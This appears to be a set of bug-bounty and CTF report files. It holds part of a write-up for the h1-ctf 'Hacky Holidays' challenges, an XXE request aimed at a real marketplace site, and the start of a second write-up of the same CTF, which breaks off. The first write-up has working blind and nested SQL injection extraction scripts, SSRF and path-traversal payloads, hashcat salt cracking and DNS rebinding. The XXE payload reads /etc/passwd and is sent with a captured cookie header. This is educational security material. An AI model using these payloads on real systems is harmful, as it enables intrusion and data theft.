Writing a script for this would be tricky because this is a second order SQL injection: we first have to set the payload, then trigger the payload with a second request. To add insult to injury, the response time on this challenge is abyssmal. Nevertheless, I developed a script to perform substring character brute forcing to ascetain the table, columns, and data needed to access the admin section.
Code 2.10 KiB
1import requests
2
3url1 = 'https://hackyholidays.h1ctf.com/evil-quiz' #POST
4url2 = 'https://hackyholidays.h1ctf.com/evil-quiz/score' #GET
5
6#threshold = 1953 # create an dict with thresold values, if we have two values
7
8alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#$%^*()-_=+[{]}\|;:,/?"
9
10s = requests.Session()
11cookie_obj = requests.cookies.create_cookie(domain='hackyholidays.h1ctf.com',name='session',value='f0dd61e4a671f34f123e36e0b8f2727c')
12s.cookies.set_cookie(cookie_obj)
13pos = 1
14threshold = 0
15out = ''
16while True:
17	found = 0
18	for c in alphabet:
19		
20		# blind sqli brute force 1: find a table
21		# select table_name from information_schema.tables where table_schema=database() limit 1
22		# discovered table named 'admin'
23		
24		# blind sqli brute force 2: find columns in admin table 
25		# select column_name from information_schema.columns where table_name='admin'
26		# discovered columns id, password, username in table 'admin'
27		
28		# blind sqli brute force 3: find username in admin table
29		# select username from admin where id='1'
30		# discovered username 'admin'
31		
32		# blind sqli brute force 4: find password in admin table
33		# select password from admin where username='admin'
34		# discovered password 'S3creT_p4ssw0rd-$'
35		
36		payload = "grinch' AND hex(substring((select password from admin where username='admin'),%s,1))=hex('%s');--" % (str(pos), c)
37		
38		params = {"name":payload}
39
40		s.post(url1, data=params)
41		r2 = s.get(url2) 
42		if (threshold == 0):
43			# response length will increase with payload length. remove the payload length from the response length to negate this
44			#100 + 50
45			#100 - 50 = 50
46			#101 + 51
47			#101 - 51 = 50
48			threshold = len(r2.text) - len(payload)
49		
50		# a true response will return at least one more byte than a false response. break and continue to the next character if we get a hit. 
51		if ((len(r2.text) - len(payload)) > threshold):
52			out += c
53			print out
54			found = 1
55			break
56			
57		# TODO: edge case where first letter in alphabet returns true response. This was done manually for finding 'admin' table
58
59	if (found):
60		pos += 1
61		continue
62	else:
63		print out
64		break
This script will select one letter at a time from the password for the username admin and perform a a boolean brute force check on each letter. The first character of the password isn't 'a' so the script continues until it gets to 'S'. The response is 1 byte larger meaning our SQL statement was true and the first character of the password is 'S'. That process is repeated until all characters are identified.
<image_20>
The final username / password combo was admin / S3creT_p4ssw0rd-$ which gave access to the flag:
<image_21>
I reran this script and it took almost an hour to complete! It took the better half of a day to finally bruteforce the password the first time around.
Flag #10 - Signup Manager
The zip of source code was easy to see
but not the PHP trick that lie underneath.
Surely there has to be some kind of quirk.
Numeric type confusion just might work!
The flag was a cut and dry case of RTFM. By carefully reading the provided code and the PHP docs, the flag is easy to spot. Regardless, this was one of my favorite challenges because I learned soemthing new about PHP! Thanks..... grinch. hmph.
Before even attempting to sign up, I found an HTML comment in the source directing me to README.md which contained the following:
Code 712 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5### How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
18
197) Default login is admin / password
I was able to download signupmanager.zip at the following URL: https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
Unzipping the file reveals the source code for the site. The file index.php appears to have the code that creates an entry in users.txt which is referenced when logging in. Based on step 6 in the README, it looks like our objective is to create an entry in user.txt that ends in Y which will make the user an admin.
I had a difficult time imagining what the entries in user.txt would look like so I spun up the php code in a digital ocean droplet to see for myself!
http://159.65.226.16/hacky/
I made users.txt accessible for ease of testing: http://159.65.226.16/hacky/users.txt
<image_22>
I tried spamming Y in the last name and maxing out the values for each aspect of the entry but was unable to extend the length beyond what was intended. Looking at the code again, I went through each validation function to see if any of them could be bypassed in some way.
Code 1.57 KiB
1        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
2            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
3            if (strlen($username) < 3) {
4                $errors[] = 'Username must by at least 3 characters';
5            } else {
6                if (isset($all_users[$username])) {
7                    $errors[] = 'Username already exists';
8                }
9            }
10            $password = md5($_POST["password"]);
11            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
12            if (strlen($firstname) < 3) {
13                $errors[] = 'First name must by at least 3 characters';
14            }
15            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
16            if (strlen($lastname) < 3) {
17                $errors[] = 'Last name must by at least 3 characters';
18            }
19            if (!is_numeric($_POST["age"])) {
20                $errors[] = 'Age entered is invalid';
21            }
22            if (strlen($_POST["age"]) > 3) {
23                $errors[] = 'Age entered is too long';
24            }
25            $age = intval($_POST["age"]);
26            if (count($errors) === 0) {
27                $cookie = addUser($username, $password, $age, $firstname, $lastname);
28                setcookie('token', $cookie, time() + 3600);
29                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
30                exit();
31            }
32        }
username, firstname, and lastname are capped at 15 chars with the substr function. the password is md5 hashed which is always 32 chars. That left age which is checked to ensure it is numeric with is_numeric and then intval is used to get the final value.
is_numeric seemed ... flexible so I looked it up in the PHP docs.
<image_23>
The entry 1337e0 stood out because it looked like a scientific notation and is considered numeric by PHP. Our PHP code specifically checks the length to ensure the number is less than 3 characters, but it could be replaced with something like 9e9 which is interprested by PHP as 9 * 10 ^ 9. This has an integer value of 9000000000 - waaay longer than 3 characters!
By capturing a signup request and modifying the age value to 9e9 and making the last name YYYYYYYYYYYYYYY the length of our age will push a Y into the last position of our entry in users.txt, making our new user an admin!
<image_24>
Got the flag and access to the Recon Server! It's game time now...
Flag #11 - Grinch Recon
He was lean and mean, a right spooky old Who
And I laughed when I saw a hint of what to do
A wink of his eye and his evil twisted head
Soon gave me to know I had everything to dread;
"We need to go deeper" I thought after a double SQLi and an SSRF. "There has to be a third SQL injection!"
This challenge was the work of a true menace. Adam is become death, the destroyer of Christmas.
Background
This recon server holds picture albums of reconnaissance photos related to Santa and his work shop. Albums are stored in a database and retrieved via a hash. Pictures within albums are retrieved securely using an authenticated server side request, precluding forgery.
Additionally, the recon server has an API which is not directly accessible. Tying everything together, you have to find way to authenticate arbitrary SSRF requests to the API in order to deduce the username and password in order to move to the next flag.
Step 1: SQL Injection #1 - hash
There was a fairly obvious SQL injection on the value of hash. I checked this manually with a simple boolean payload: ' AND 1=1;--
200, album loads: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%201=1;--
404: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%201=0;--
I loaded up SQLMap and dumped the database:
sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump
Code 403 Bytes
1Database: recon                                                                                                                                                                       
2Table: album
3[3 entries]
4+----+--------+-----------+
5| id | hash   | name      |
6+----+--------+-----------+
7| 1  | 3dir42 | Xmas 2018 |
8| 2  | 59grop | Xmas 2019 |
9| 3  | jdh34k | Xmas 2020 |
10+----+--------+-----------+
Code 777 Bytes
1Database: recon                                                                                                                                                                       
2Table: photo
3[6 entries]
4+----+----------+--------------------------------------+
5| id | album_id | photo                                |
6+----+----------+--------------------------------------+
7| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
8| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
9| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
10| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
11| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
12| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
13+----+----------+--------------------------------------+
Step 2: recon on r3c0n
That was nice and all... but I still couldn't couldn't figure out how I was going to authenticate to the API. Let's dig around and see how this whole thing is set up.
The /picture endpoints loaded in the albums look like this:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
And the data parameter contains the following JSON object:
Code 127 Bytes
1{
2  "image": "r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg",
3  "auth": "bbf295d686bd2af346fcd80c5398de9a"
4}
Any attempts to modify the image URL and auth hash and resend the request resulted in invalid authentication hash. It seemed like it had to be generated the hash on the backend.
There's also an API hosted at https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api
<image_25>
Step 3: SQL Injection #2 - state of the union of the union
Around this time, I started to reach out to other CTFers on discord to brainstorm how to do this challenge. A small team formed and @mava contributed an amazing idea: double SQL injection.
I started to imagine what the underlying SQL query(s) looked like for the /album endpoint. There were two tables and the ID had to come from the hash in the first table.
Query #1
Code 43 Bytes
1SELECT id FROM album WHERE hash = 'jdh34k '
Value from query #1 is sent to query #2
Code 44 Bytes
1SELECT photo FROM photo where album_id = '1'
Looking at these two queries... it seemed possible that you could UNION something to the output of query #1 that would be injected into query #2.
I was able to craft the following initial SQLi payload that shows you can control the value sent to the second query with a UNION
First album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%221%22,%22456%22,%22789%22%20--+
Second album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%222%22,%22456%22,%22789%22%20--+
Third album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%223%22,%22456%22,%22789%22%20--+
If we can nestle a payload into the first union slot, we should be able to execute a SQLi inside a SQLi. I started with an ORDER BY to determine there were three columns, which makes sense based on the DB dump performed earlier.
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%221%27%20ORDER%20BY%203--+%22,%22456%22,%22789%22%20--+
1' UNION SELECT "1' ORDER BY 3-- ","456","789" --
Now we can perform the second UNION:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,3%27--+%22,%22456%22,%22789%22--+
1' UNION SELECT "' UNION SELECT 1,2,3'-- ","456","789"--
which produces this URL:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMiLCJhdXRoIjoiZmVhNzUwNzQ3OGFhODIyNWMwMjI1MjdiMTc2M2ZiMzMifQ==
which (doesnt return an invalid hash error!! and) decodes to
Code 85 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
NICE! we can now modify the 3 in our embedded payload to injected a path traversal SSRF payload to start analyzing the API!
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=123%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/x%27--+%22,%22456%22,%22789%22--+
Here's the full URL decoded SQL injection payload:
Code 67 Bytes
1123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"-- 
Step 4: SSRF and API analysis
For this part, I got a little inefficient and used Burp's Intruder to fuzz for valid API endpoints. I ran an inital fuzz using a common.txt wordlist to collect base64 data parameters using the "Grep - Extract" intruder option.
<image_26>
I then ran a second attack on the picture endpoint with the collected base64 values and analyzed the responses to determine which endpoints were valid.
<image_27>
I ended up finding two endpoints that triggered an "Invalid content type detected" error: /api/ping and /api/user. This response indicates that the request was successful and returned a 200 response, but the content type was not an image. I'm confident that ping was a total red herring because I didn't find anything remotely useful with it.
Now is when the API documentation comes in handy.
<image_28>
If an invalid parameter is passed to an API endpoint, a 400 response is returned. I ran the exact same attack already outlined above to determine valid parameters on the user endpoint. Valid parameters trigger a 204 response.
The valid parameters for the endpoint are username and password. The last piece of this puzzle was to figure out valid values for those parameters.
Step #5: SQL Injection #3 - We have to go deeper! ... again
Looking for interesting errors, I ran the attack outlined in step 3 a third time, but I used a list of ASCII metachars to look for errors or different responses. During that attack, I noticed that a % character in the username parameter triggered the Invalid content type error, meaning a 200 response.
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-4685%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/user?username=%25%27--+%22,%22456%22,%22789%22--+
Thinking about it a little harder, it looks like we have a reflection context inside a SQL LIKE query! Here's what I imagine the query to look like:
Code 62 Bytes
1SELECT * FROM user WHERE username LIKE '%' OR password LIKE ''
Using this functionality, we can do a substring brute force to discover the username and password values - similar to what we did for Flag #9.
I used the following script to extract the username and password:
Code 1.14 KiB
1import requests
2from lxml import html
3
4alphabet = "abcdefghijklmnopqrstuvwxyz0123456789~`!%@#$^*()-_=+[{]}\|;:,<.>/?"
5
6host = "https://hackyholidays.h1ctf.com"
7url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=?hash=-4685%%27%%20UNION%%20SELECT%%20%%22%%27%%20UNION%%20SELECT%%20null,null,%%27../api/user?username=grinchadmin%%26password=%s%%25%%27--+%%22,null,null--+%%22"
8
9#username = grinchadmin
10#password = s4nt4sucks
11out = ''
12found = 0
13while True:
14	for c in alphabet:
15		# _ (underscore) is another wildcard character in MySQL. I escaped a few other tricky characters just in case. 
16		if c == '_':
17			c = '\_'
18		if c == '%':
19			c = '\%'
20		if c == '\\':
21			c = '\\\\'
22
23		# add found letters into the payload 
24		tester = url % (out+c)
25		# send the payload
26		r = requests.get(tester)
27		# parse html
28		tree = html.fromstring(r.text)
29		# get /picture?data=base64 URL
30		url2 = tree.xpath('//img')[1].items()[1][1]
31		# send second request
32		r2 = requests.get(host+url2)
33
34		# if response contains "Invalid", we have found a letter
35		if "Invalid" in r2.text:
36			out += c
37			found = 1
38			break
39	print out
40	if not found:
41		print out
42		break
43	else:
44		found = 0
Here's the output from that script:
<image_29>
With the username/password combo of grinchadmin / s4nt4sucks I was able to log into the Attack Box and retrieve the flag!
<image_30>
Flag #12 - Grinch Network Attack Server
He spoke not a word, but went straight to his hack,
He had found the IPs and started the attack!
Do or Die! We must now lend Santa our aid
To take down Grinch Networks and save the day!
Thankfully, the hardest was not saved for last! While this flag was more straightforward, I definitely struggled finding the initiial foothold. I tried just about everything but using hashcat to crack a password acting as a salt!
Thanks to our ragtag #grincharmy team, we were able to find flag 12 and take down Grinch Networks to save Christmas.
Max, @mava
castilho, https://twitter.com/castilho101
h3x0ne, https://twitter.com/h3xone
d3f4u17, https://twitter.com/_d3f4u17_
Panya, https://github.com/panya
chron0x, https://twitter.com/chron0x1
Here's how we did it:
Summary:
The Attack Box is set up to target and launch DDoS attacks against three of Santa's IP's. These attacks can be launched by clicking "Attack" which triggers a request like the following:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
This launches a spookily realistic attack on the targeted IP! (sorry Santa!)
the payload parameter decoded is
Code 67 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
Argh! another hash! The last one in Flag 11 gave us headaches plenty. In order to stop the Grinch, we had to point the target at itself so the network would take itself down.
Feeling Salty
Try as we might, we couldn't find any way to bypass the hash protection. I did find that - could be used in the target without triggering an error, indicating a domain could be passed as a target - but we'll talk more about that soon.
The suggestion of hashcat was brought up and we started to see if we could crack whatever was being used to authorize the IP addresses. The assumption that the authentication hash was generated in one of two ways:
md5(password + ip)
md5(ip + password)
There's not an exact command line argument in hashcat for this specific situation, but there are two modes that are similar enough to work:
Code 522 Bytes
1- [ Hash modes ] -
2
3      # | Name                                             | Category
4  ======+==================================================+======================================
5    900 | MD4                                              | Raw Hash
6      0 | MD5                                              | Raw Hash
7  ...
8     10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated
9     20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated
After some tweaking and testing, we found that attack mode 10 worked! The authenticated hash was being generated with md5('mrgrinch463'+ip)
hashcat command
Code 82 Bytes
1hashcat -m 10 -O 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt --force
Output:
Code 930 Bytes
1Dictionary cache hit:
2* Filename..: /usr/share/wordlists/rockyou.txt
3* Passwords.: 14344385
4* Bytes.....: 139921507
5* Keyspace..: 14344385
6
75f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
8                                                 
9Session..........: hashcat
10Status...........: Cracked
11Hash.Type........: md5($pass.$salt)
12Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33
13Time.Started.....: Mon Dec 28 21:10:03 2020 (2 secs)
14Time.Estimated...: Mon Dec 28 21:10:05 2020 (0 secs)
15Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
16Guess.Queue......: 1/1 (100.00%)
17Speed.Dev.#1.....:  2218.0 kH/s (0.96ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
18Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
19Progress.........: 5352547/14344385 (37.31%)
20Rejected.........: 1123/5352547 (0.02%)
21Restore.Point....: 5349475/14344385 (37.29%)
22Candidates.#1....: mrkitty18 -> mrbrln07
23HWMon.Dev.#1.....: N/A
DNS Rebinding
With the password cracked, all we had to do now what make an authentication hash for 127.0.0.1 right?? WRONG!
Here's the hash:
md5('mrgrinch463127.0.0.1') == 3e3f8df1658372edf0214e202acb460b
Here's the payload:
{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
Here's the launch URL:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
But here's the issue: "Local target detected, aborting attack"
<image_31>
We know domains can be used in the target field since dashes are allowed. The first thing that comes to mind is a DNS Rebinding attack. The site http://1u.ms/ has a succint explanation that details why this would work in this case:
DNS rebinding is a well-known technique targeting TOCTOU (Time-of-check to time-of-use) type of vulnerabilities during IP blacklisting or whitelisting. It is performed using a domain that resolves in a legit IP during the first request (check) and to the forbidden one during the second request (use).
In our case, we'd like to craft a domain that resolves to 203.0.113.213 for the check and then the localhost 127.0.0.1 when the attack is launched.
We can make a domain that behaves like this using a this tool: https://lock.cmpxchg8b.com/rebinder.html
<image_32>
And now we have this domain which randomly resolve to either 127.0.0.1 or 203.0.113.213: cb0071d5.7f000001.rbndr.us. This took a few times to work because we have to win two "coin flips" of the IP pointing to 203.0.113.213 first and then 127.0.0.1 for the actual attack.
With a domain prepared, we can relaunch the attack!
Here's the hash:
md5('mrgrinch463cb0071d5.7f000001.rbndr.us') == 51a799c562ed548d5ce9c8f4d1e71455
Here's the payload:
{"target":"cb0071d5.7f000001.rbndr.us","hash":"51a799c562ed548d5ce9c8f4d1e71455"}
Here's the launch URL:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJjYjAwNzFkNS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI1MWE3OTljNTYyZWQ1NDhkNWNlOWM4ZjRkMWU3MTQ1NSJ9
After a few tries, the rebinding attack works and we've DDoS'd Grinch Networks and saved the holidays!
<image_33>
Epilogue
I'm glad that we saved Christmas but I'm sad that it's over. These were 12 fantastic challenges - and they were a challenge in every sense of the word. I look forward to more CTF's made by Adam in the future!
Grinch sprang to his sleigh, to Max he gave a whistle,
And away they all flew like the down of a thistle.
But I heard him exclaim, ere he drove out of sight—
“Happy Hackmas to all, and to all a good night!”
@bendtheory
Impact
The Grinch could have stolen Christmas! Were it not for the dozen or holes identified in his Network. I hear his IT guy - Adam? - is in world of trouble right now.



==================================================

Report File: 106802.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Command Injection - Generic

Contents:

Request:
POST /__services/v2/rest/wall/new/count HTTP/1.1
Host: marketplace.informatica.com
Connection: keep-alive
Content-Length: 249
Accept: application/json, text/javascript, */*
X-J-Token: no-user
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Origin: https://marketplace.informatica.com
Referer: https://marketplace.informatica.com/profile-status-list.jspa?view=wallentry&username=jan-hendrik.huehne@bearingpoint.com
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: jive.server.info="serverName=marketplace.informatica.com:serverPort=443:contextPath=:localName=localhost.localdomain:localPort=9001:localAddr=127.0.0.1"; BIGipServermarketplace-new-int-Pool=958464266.20480.0000; __cdrop=.9IJG7.; __csess=1450347852471.CBUFVZ.; c08ea716-2192-4af0-b0be-eb4589f8bd3c=%7B%22parent_id%22%3A%22%22%2C%22id%22%3A%22kKfiDh-GHos%22%2C%22wom%22%3Afalse%2C%22fb_source%22%3A%22%22%2C%22url_tag%22%3A%22NOMTAG%22%7D; do_mkto_call=true; LastMRH_Session=d922d108; LiveBall=uid=9700856&uky=8BZWQCQN&rid=10286008; MRHSession=4c2087c52f486b2d8fe80461d922d108; s_dmdbase=rsp%3Dmatch%26cData%3D25961098%253ACjsc%2520Mastel%253AAutomotive%253AServices%253A1%2520to%252049%253A0-49%2520milli%253ASMB%253AAutomotive%26cDataCustom%3D%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253AMoscow%253Anull%253ARU%253A7514%26cDataCustom2%3Dnull%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%26sentAA%3DT; timeEnd_cookie=1450346443718; wm-ueug=%22yarbabin@gmail.com%22; wm-ag-d={%22st%22:1450435346802%2C%22sc%22:1%2C%22v%22:0%2C%22et%22:1450359167387%2C%22u%22:0}; s_sess=%20s_visitid%3D1450189337951%3B%20v16%3D%3B%20v32%3D%3B%20s_ppvl%3Dwww%25253Aus%25253Aen%25253Aproducts%25253Adata-integration%25253Areal-time-integration%25253Arulepoint-complex-event-processing%252C58%252C58%252C1019%252C1858%252C1019%252C1920%252C1080%252C1%252CP%3B%20s_ppv%3Dwww%25253Aus%25253Aen%25253Aproducts%25253Adata-integration%25253Areal-time-integration%25253Arulepoint-complex-event-processing%252C96%252C46%252C2119%252C1858%252C1019%252C1920%252C1080%252C1%252CP%3B; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16794%7CMCMID%7C91737586653844139563863898912439590649%7CMCAID%7CNONE%7CMCAAMLH-1451408130%7C6%7CMCAAMB-1451571056%7Chmk_Lq6TPIBMW925SPhw3Q; JSESSIONID=67E6B255C5D2DAFF90610E94CB8B7D2A.; _ga=GA1.2.1092629952.1450189330; mkt_cookie=known; mbox=PC#1450189325935-186730.26_07#1452186131|check#true#1450976591|session#1450976530070-819656#1450978391; s_vnum=1452773966363%26vn%3D12; s_ppv=-%2C100%2C63%2C1319; __utmt=1; jive.recentHistory.-1=332c3136363137383b31342c323334353b31342c323334373b312c3130343130323b; s_cc=true; gpv_p8=Search; s_nr=1450984732287-Repeat; s_invisit=true; s_sq=informaticamarketplace%252Cinformaticamarketplace2%252Cinformaticacommunity%3D%2526pid%253Dinformatica%252520marketplace%252520community%2526pidt%253D1%2526oid%253Djavascript%25253A%25253B%2526ot%253DA; __utma=151370917.193365317.1450183778.1450970821.1450981714.11; __utmb=151370917.11.10.1450981714; __utmc=151370917; __utmz=151370917.1450981714.11.10.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1450183777729-16344
Content-Type: application/xml;charset=UTF-8
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd1" >]>
<count>
<tabName>profile</tabName>
<widgetID>&xxe;</widgetID>
<filterType>Only</filterType>
</count>
Response:
JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory).



==================================================

Report File: 1068433.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Server-Side Request Forgery (SSRF)

Contents:

h1-ctf: 12 Days of Hacky Holidays
This is my writeup for 12 Days of Hacky Holidays. The report is written such that beginners to CTFs will be able to learn the tricks of the trade.
The Mission:
The Grinch has gone hi-tech this year with the intention of ruining the holidays 😱We need you to infiltrate his network and take him down! Check out all the details on https://hackerone.com/h1-ctf to learn more!
Contents
I laid out all the days here with their title and vulnerability. For more information about the vulnerability types, https://portswigger.net/web-security/all-materials is a great resource.
Day	Title	Vulnerability
1	robots.txt	Information Disclosure
2	DOM Flag	Information Disclosure
3	People Rater	Insecure Direct Object Reference (IDOR)
4	Swag Shop	Insecure Direct Object Reference (IDOR)
5	Secure Login	Password Bruteforcing
6	My Diary	Business Logic Vulnerability
7	Hate Mail Generator	Server Side Template Injection (SSTI)
8	Grinch Forum	Open Source Intelligence (OSINT)
9	Evil Quiz	SQL Injection
10	Sign Up Manager	Business Logic Vulnerability
11	Recon Server	SQL Injection / Server Side Request Forgery (SSRF)
12	Attack Box	Hash Cracking / DNS Rebinding

Day 1
Let's jump right in and see what the Grinch is up to:
<image_0>
Well, that's not very inviting! A usual place to look for URL paths of note is the robots.txt file. Accessing it at https://hackyholidays.h1ctf.com/robots.txt returned:
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
Awesome! We have our first flag, flag{48104912-28b0-494a-9995-a203d1e261e7}. And if the site is going to "Disallow" robots from accessing /s3cr3t-ar3a, then that looks like a great place to check out next.
Takeaways
robots.txt can sometimes reveal interesting hidden directories
Day 2
Another day means it is time to make more hot chocolate and capture some more 🚩s.
Let's check out that /s3cr3t-ar3a path from yesterday:
<image_1>
Looking closely at the page HTML in the browser developer tools, there's a suspicious div:
Code 131 Bytes
1<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
Alright! We have our flag, flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}, and path to check out tomorrow, /apps.
Takeaways
Sometimes you can find unintended secrets in a webpage's source
Day 3
Jumping into /apps we can see a list view. Looks like we only have one available right now, but that more will appear as the days go on:
<image_2>
We get a prompt after clicking the button:
The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!
The people rater is pretty simple:
<image_3>
Clicking a name triggers a popup with the Grinch's review of that person:
<image_4>
Rude. Monitoring the network activity with the Burp Suite proxy, I could see that pressing the first button sends this request:
Request:
Code 39 Bytes
1GET /people-rater/entry?id=eyJpZCI6Mn0=
Letters and numbers together ending with an equals sign indicates that the id parameter is probably encoded in base64. Using CyberChef we can decode the ID from base64 to reveal {"id":2}. Pretty weird how the first element in the list has an id of 2 isn't it? I wonder what would happen if we manually requested this api with {"id":1} encoded in base64?
Request:
Code 39 Bytes
1GET /people-rater/entry?id=eyJpZCI6MX0=
Code 135 Bytes
1{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
Grinch clearly thinks highly of himself! Let's grab the flag and wait for tomorrow.
Takeaways
You can learn how a site API works from intercepting network requests. Then you can interact with the API as you please, even if the UI does not expose the extra functionality.
Day 4
Looks like the new app of the day from /apps is the Swag Shop:
Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
<image_5>
Not sure about you, but I could do with a backup launcher for my snowballs. Let's buy one.
<image_6>
Hmm, looks like we need to authenticate to buy something. It would be a good idea to explore the API a bit to see what is available.
Exploring the API
Clicking around the site while proxying through Burp Suite revealed these endpoints:
GET /swag-shop/api/stock
Shows the available products in store
Shows the available products in store
POST /swag-shop/api/purchase
Attempts to purchase (but returns 401 Unauthorized for us)
Attempts to purchase (but returns 401 Unauthorized for us)
POST /swag-shop/api/login
Attempts to login
Attempts to login
We can fuzz the api with a wordlist from SecLists to see if there's anything interesting. The following command shows all requests that return a non 404 response:
Code 252 Bytes
1$ ffuf -w common-api-endpoints-mazen160.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -fc 404 -mc all
2
3sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
4user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
Cool! Let's GET the /swag-shop/api/sessions endpoint and see the reply:
Code 1.18 KiB
1{
2    "sessions": [
